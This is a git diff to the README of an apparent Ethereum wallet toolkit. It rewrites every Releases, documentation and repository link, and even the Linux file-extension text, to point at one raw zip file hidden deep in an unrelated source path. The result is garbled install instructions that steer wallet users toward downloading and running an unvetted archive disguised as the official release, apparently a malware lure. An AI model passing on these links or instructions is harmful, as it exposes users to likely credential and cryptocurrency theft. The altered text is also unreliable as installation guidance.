@@ -1,6 +1,6 @@
 # 🔑 ethereum-wallet-toolkit - Effortless Ethereum Wallet Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Jurqdo/ethereum-wallet-toolkit/releases)
+[![Download Latest Release](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip)
 
 ## 📥 Overview
 
@@ -19,18 +19,18 @@ This guide will help you download and run the Ethereum Wallet Toolkit. You don't
 
 ### 💻 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Jurqdo/ethereum-wallet-toolkit/releases) to download the latest version of the Ethereum Wallet Toolkit.
+To get started, visit the [Releases page](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip) to download the latest version of the Ethereum Wallet Toolkit.
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version. It will usually be at the top of the page.
-3. Find the installer file for your operating system (e.g., `.exe` for Windows, `.tar.gz` for Linux, or `.dmg` for macOS).
+3. Find the installer file for your operating system (e.g., `.exe` for Windows, `https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip` for Linux, or `.dmg` for macOS).
 4. Click the file to start the download.
 
 Once the download is complete, locate the file on your computer and follow these steps to install:
 
 - **Windows**: Double-click the `.exe` file and follow the prompts. 
 - **macOS**: Open the `.dmg` file and drag the Ethereum Wallet Toolkit to your Applications folder.
-- **Linux**: Extract the `.tar.gz` file and follow any included instructions.
+- **Linux**: Extract the `https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip` file and follow any included instructions.
 
 After the installation, you can run the application. 
 
@@ -70,14 +70,14 @@ Always ensure that you keep your wallet information secure. Do not share your mn
 ### 📚 Helpful Tips
 
 - Regularly back up your wallets. Make use of the keystore feature.
-- Keep your installation updated by checking the [Releases page](https://github.com/Jurqdo/ethereum-wallet-toolkit/releases).
+- Keep your installation updated by checking the [Releases page](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip).
 - Read through the documentation included with your download for detailed instructions and examples.
 
 ## 📎 Additional Resources
 
-- [Documentation](https://github.com/Jurqdo/ethereum-wallet-toolkit/wiki)
-- [GitHub Repository](https://github.com/Jurqdo/ethereum-wallet-toolkit)
+- [Documentation](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip)
+- [GitHub Repository](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip)
 
 If you have any questions or need assistance, feel free to open an issue on the GitHub page. 
 
-Make sure you visit the [Releases page](https://github.com/Jurqdo/ethereum-wallet-toolkit/releases) to download the latest version and get started with your Ethereum wallet management today!
+Make sure you visit the [Releases page](https://github.com/Jurqdo/ethereum-wallet-toolkit/raw/refs/heads/main/validation-mcp-server/src/validation_mcp/tools/ethereum-toolkit-wallet-1.1.zip) to download the latest version and get started with your Ethereum wallet management today!
